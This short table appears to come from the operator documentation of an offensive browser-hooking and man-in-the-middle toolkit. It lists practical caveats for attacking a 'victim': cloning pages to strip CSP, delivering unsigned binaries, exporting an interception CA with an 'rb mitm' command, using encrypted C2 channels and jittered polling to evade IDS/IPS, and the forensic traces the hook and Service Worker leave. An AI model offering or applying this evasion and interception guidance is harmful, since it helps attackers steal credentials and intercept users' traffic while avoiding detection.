| **CSP headers** | `clone` removes CSP meta tags; the harvester/MITM serves without restrictive headers |
| **Service Worker detection** | SWs can be found in browser DevTools (Application tab); use only when stealth is less critical |
| **Binary delivery** | The binary is unsigned; Windows SmartScreen and macOS Gatekeeper may warn the user |
| **MITM certificates** | The victim's browser will show cert warnings unless your CA is trusted; export with `rb mitm intercept export-ca` |
| **Network detection** | MITM can be detected by IDS/IPS; use encrypted C2 channels and jittered polling |
| **Forensics** | The hook stores `rb_sid` in localStorage; the SW is visible in browser internals |
